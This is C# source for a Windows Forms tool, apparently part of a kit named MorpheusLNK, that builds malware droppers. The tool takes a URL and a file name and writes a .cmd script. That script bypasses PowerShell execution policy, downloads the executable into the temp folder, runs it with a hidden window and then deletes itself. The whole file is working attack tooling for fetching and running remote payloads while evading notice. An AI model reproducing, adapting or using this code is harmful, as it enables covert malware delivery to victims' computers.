using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace MorpheusLNK
{
    public partial class CMD_DROPPER : Form
    {
        public CMD_DROPPER()
        {
            InitializeComponent();
        }

        private void cmdBuild_btn_Click(object sender, EventArgs e)
        {
            string url = downloadUrl_Box.Text;
            string exeName = afterExe_Name.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(exeName))
            {
                SetStatusLabel("Status: Error form cannot be empty!", Color.Red);
                return;
            }

            try
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = "CMD files|*.cmd";
                saveFileDialog1.Title = "Save CMD-SCRIPTLET File";
                saveFileDialog1.ShowDialog();

                if (saveFileDialog1.Filter != "")
                {
                    string filePath = saveFileDialog1.FileName;
                    string cmdContent = GenerateCMDScript(url, exeName);
                    File.WriteAllText(filePath, cmdContent);
                    SetStatusLabel("CMD scriptlet created successfully!", Color.Green);
                } 
                
                else
                {
                    SetStatusLabel("Status: CMD-script build failed!", Color.Red);
                }


             } catch (Exception ex)
            {
                MessageBox.Show($"{ex}");
            }

        }

        private string GenerateCMDScript(string url, string exeName)
        {
            string powerShellCommand = $"Invoke-WebRequest -Uri \"{url}\" -OutFile \"$env:temp\\{exeName}\"; Start-Process -FilePath \"$env:temp\\{exeName}\" -WindowStyle Hidden";
            string cmdScript = $@"
mode 15,1
@echo off
powershell.exe -ep bypass -Command {powerShellCommand}
del %0
";
            return cmdScript;
        }

        private async void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = text;
            await Task.Delay(3000);
            statusLabel.Text = "";
        }
    }
}
